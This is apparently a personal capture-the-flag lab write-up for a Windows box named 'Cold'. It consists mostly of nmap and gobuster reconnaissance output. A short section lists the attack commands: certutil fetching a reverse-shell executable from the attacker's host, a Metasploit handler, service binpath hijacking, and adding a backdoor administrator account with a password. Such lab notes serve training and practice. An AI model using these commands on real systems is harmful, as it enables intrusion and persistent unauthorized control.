---
tags: [Beginner, Video, Windows]
title: Cold
created: '2020-07-03T08:22:32.774Z'
modified: '2020-10-02T17:40:40.732Z'
---

# Cold
- IP: `172.31.1.15`
- OS: `Windows`
## General
### Versions
- XAMMP 7.2.30
## Enumeration
### Writeup
certutil -urlcache -split -f http://10.10.0.8/reverse.exe C:\pink\reverse.exe

use exploit/multi/handler

sc config cold binpath="C:\pink\reverse.exe"

net user pink P1nkDracon!an /add
net localgroup administrators pink /add
evil-winrm -i 173.31.1.15 -u pink -p 'P1nkDracon!an'
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.15`
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.30)
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.30
| http-title: Welcome to XAMPP
|_Requested resource was http://172.31.1.15/dashboard/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.30)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.30
| http-title: Welcome to XAMPP
|_Requested resource was https://172.31.1.15/dashboard/
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5500/tcp  open  http         Jetty 9.3.6.v20151106
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: Jetty(9.3.6.v20151106)
|_http-title: Error 404 
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6095/tcp  open  unknown
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|_    JNB70*
6096/tcp  open  unknown
7993/tcp  open  unknown
8018/tcp  open  unknown
8500/tcp  open  http         Samsung AllShare httpd
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: 404
8581/tcp  open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 403 Forbidden
|     Content-Length: true
|_    Forbidden
20007/tcp open  unknown
20008/tcp open  unknown
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49163/tcp open  msrpc        Microsoft Windows RPC
49192/tcp open  msrpc        Microsoft Windows RPC
49193/tcp open  msrpc        Microsoft Windows RPC
```
</details>

<details>
<summary>Gobuster</summary>

- `gobuster dir --wordlist /usr/share/wordlists/dirb/vulns/coldfusion.txt --url http://172.31.1.15:8500/`
```
/CFIDE/administrator (Status: 302)
/CFIDE (Status: 302)
/CFIDE/administrator/aboutcf.cfm (Status: 200)
/CFIDE/administrator/checkfile.cfm (Status: 200)
/CFIDE/administrator/header.cfm (Status: 200)
/CFIDE/administrator/index.cfm (Status: 200)
/CFIDE/administrator/homepage.cfm (Status: 200)
/CFIDE/administrator/enter.cfm (Status: 200)
/CFIDE/administrator/logout.cfm (Status: 200)
/CFIDE/administrator/linkdirect.cfm (Status: 200)
/CFIDE/administrator/login.cfm (Status: 200)
/CFIDE/administrator/navserver.cfm (Status: 200)

```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
